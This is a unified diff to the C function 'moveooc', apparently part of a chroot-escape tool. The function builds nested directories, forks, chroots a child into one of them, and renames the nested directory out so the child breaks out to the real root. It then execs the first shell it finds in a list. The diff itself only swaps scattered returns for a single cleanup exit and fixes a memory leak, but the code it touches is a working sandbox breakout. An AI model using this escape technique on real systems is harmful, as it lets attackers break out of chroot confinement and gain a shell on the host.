@@ -1020,31 +1020,32 @@ int moveooc(char *chrootdir, char *nesteddir, char *newdir)
     struct stat dirstat;
     pid_t pid;
     char *childdir = NULL;
+    int return_value = 0xDEADBEEF;
 
     size = strlen(chrootdir)+strlen(nesteddir)+2;
     if ((childdir = malloc(size)) == NULL)
     {
 	printf("[-] error allocating memory\n");
-	return 0xDEADBEEF;
+	goto safe_exit;
     }
     snprintf(childdir, size, "%s/%s", chrootdir, nesteddir);
 
     if ((err = stat(chrootdir, &dirstat)) == 0) 
     {
 	printf("[-] %s exists, please remove\n", chrootdir);
-	return 0xDEADBEEF;
+	goto safe_exit;
     }
     if ((err = stat(newdir, &dirstat)) == 0)
     {
 	printf("[-] %s exists, please remove\n", newdir);
-	return 0xDEADBEEF;
+	goto safe_exit;
     }
     
     printf("[+] creating %s directory\n", chrootdir);
     if (mkdir(chrootdir, 0700))
     {
 	printf("[-] error creating %s\n", chrootdir);
-	return 0xDEADBEEF;
+	goto safe_exit;
     }
 
     printf("[+] creating %s directory\n", childdir);
@@ -1052,7 +1053,7 @@ int moveooc(char *chrootdir, char *nesteddir, char *newdir)
     {
 	printf("[-] error creating %s\n", childdir);
 	rmdir(chrootdir);
-	return 0xDEADBEEF;
+	goto safe_exit;
     }
 
     printf("[+] forking...\n");
@@ -1064,22 +1065,22 @@ int moveooc(char *chrootdir, char *nesteddir, char *newdir)
 	printf("[+] 0: change working directory to: %s\n", chrootdir);
 	if (chdir(chrootdir) != 0)
 	{
-	    printf("[-] 0: cannot change directory\n");	
-	    return 0xDEADBEEF;
+	    printf("[-] 0: cannot change directory\n");
+	    goto safe_exit;
 	}
 	
 	printf("[+] 0: chrooting to %s\n", chrootdir);
 	if (chroot(".") != 0)
 	{
 	    printf("[-] 0: chroot failed to %s\n", chrootdir);
-	    return 0xDEADBEEF;
+	    goto safe_exit;
 	}
 	
 	printf("[+] 0: change working directory to: %s\n", nesteddir);
 	if (chdir(nesteddir) != 0)
 	{
 	    printf("[-] 0: cannot change directory\n");	
-	    return 0xDEADBEEF;
+	    goto safe_exit;
 	}
 
 	printf("[+] 0: sleeping for 2 seconds\n");
@@ -1089,27 +1090,26 @@ int moveooc(char *chrootdir, char *nesteddir, char *newdir)
 	if (movetotheroot())
 	{
 	    printf("[-] 0: cannot change directory ../\n");
-	    return 0xDEADBEEF;
+	    goto safe_exit;
 	}
 
 	printf("[+] 0: chrooting to real root\n");
 	if (chroot(".") != 0)
 	{
 	    printf("[-] 0: chroot failed\n");
-	    return 0xDEADBEEF;
+	    goto safe_exit;
 	}
 	
-	free(childdir);
-
 	for (i=0; i<SHELLNUM; i++)
 	{
 	    if ((err = stat(shells[i], &dirstat)) == 0)
 	    {
 #if !__sun
-                return execve(shells[i], NULL, NULL);
+                return_value = execve(shells[i], NULL, NULL);
 #else
-                return execl(shells[i], NULL, NULL);
+                return_value = execl(shells[i], NULL, NULL);
 #endif
+                goto safe_exit;
 	    }
 	}
     }
@@ -1119,11 +1119,13 @@ int moveooc(char *chrootdir, char *nesteddir, char *newdir)
 	sleep(1);
 	printf("[+] 1: mv %s to %s\n", childdir, newdir);
 	rename(childdir, newdir);
-	
-	return 0;
     }
 
-    return 0;
+    return_value = 0;
+
+safe_exit:
+    if (childdir) free(childdir);
+    return return_value;
 }
 #endif
 
